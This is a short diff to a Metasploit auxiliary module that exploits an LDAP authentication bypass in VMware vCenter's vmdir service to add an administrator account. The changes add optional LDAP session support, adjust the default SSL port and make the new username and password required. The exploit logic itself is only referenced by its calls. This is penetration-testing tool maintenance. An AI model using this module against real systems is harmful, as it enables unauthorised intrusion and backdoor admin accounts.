@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::LDAP
+  include Msf::OptionalSession::LDAP
   include Msf::Exploit::Remote::CheckModule
 
   def initialize(info = {})
@@ -42,6 +43,7 @@ class MetasploitModule < Msf::Auxiliary
         'DefaultAction' => 'Add',
         'DefaultOptions' => {
           'SSL' => true,
+          'RPORT' => 636, # SSL/TLS
           'CheckModule' => 'auxiliary/gather/vmware_vcenter_vmdir_ldap'
         },
         'Notes' => {
@@ -53,10 +55,9 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
-      Opt::RPORT(636), # SSL/TLS
       OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
-      OptString.new('NEW_USERNAME', [false, 'Username of admin user to add']),
-      OptString.new('NEW_PASSWORD', [false, 'Password of admin user to add'])
+      OptString.new('NEW_USERNAME', [true, 'Username of admin user to add']),
+      OptString.new('NEW_PASSWORD', [true, 'Password of admin user to add'])
     ])
   end
 
@@ -99,7 +100,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     ldap_connect do |ldap|
-      print_status("Bypassing LDAP auth in vmdir service at #{peer}")
+      print_status("Bypassing LDAP auth in vmdir service at #{ldap.peerinfo}")
       auth_bypass(ldap)
 
       print_status("Adding admin user #{new_username} with password #{new_password}")
